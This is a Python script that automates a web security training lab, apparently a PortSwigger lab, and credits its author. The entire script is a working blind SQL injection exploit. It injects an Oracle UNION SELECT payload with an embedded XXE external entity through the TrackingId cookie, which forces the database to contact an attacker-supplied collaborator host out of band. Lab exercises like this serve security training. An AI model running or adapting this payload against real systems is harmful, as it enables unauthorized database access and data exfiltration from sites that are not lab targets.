import requests
from urllib.parse import quote_plus
import sys


class LabSolver:
    def __init__(self, lab_url, collaborator_payload):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.tracking_id = None
        self.collaborator_payload = collaborator_payload

    def initiate_first_request(self):
        self.session.get(self.lab_url)
        self.tracking_id = list(self.session.cookies.items())[0][1]

    def send_request(self):
        payload = ('\' UNION SELECT EXTRACTVALUE(xmltype(\'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root '
                   '[ <!ENTITY % remote SYSTEM "http://{}/"> '
                   '%remote;]>\'),\'/l\') FROM dual--').format(self.collaborator_payload)
        payload = quote_plus(payload)
        self.session.cookies.set('TrackingId', self.tracking_id + payload)
        self.session.get(self.lab_url)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.initiate_first_request()
        self.send_request()
        self.check_solution()


solver = LabSolver(sys.argv[1], sys.argv[2])
solver.solve()
